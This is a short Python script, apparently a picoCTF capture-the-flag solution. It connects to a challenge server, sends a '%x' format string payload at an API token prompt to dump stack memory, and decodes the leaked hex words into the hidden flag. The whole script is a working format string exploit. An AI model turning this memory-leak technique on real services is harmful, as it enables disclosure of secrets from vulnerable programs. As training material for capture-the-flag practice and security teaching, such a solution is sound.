import socket
def recvuntil(sock, txt):
    data = ""
    while not data.endswith(txt):
        data += sock.recv(1).decode()
    print(data)
    return data

# string to write to
s = ""
hostname='mercury.picoctf.net'
port = 27912
# open up remote connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((hostname, port))


# get to vulnerability
recvuntil(sock, "View my")
sock.sendall(bytes("1\n", 'utf-8'))
recvuntil(sock, "What is your API token?\n")

# send string to print stack
sock.sendall(bytes("%x" + "-%x"*40 + "\n", 'utf-8'))

# receive until the line we want
recvuntil(sock, "\n")

# read in line
x = recvuntil(sock, "\n")

# remove unwanted components
x = x[:-1]

# parse to characters
for i in x.split('-'):
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)
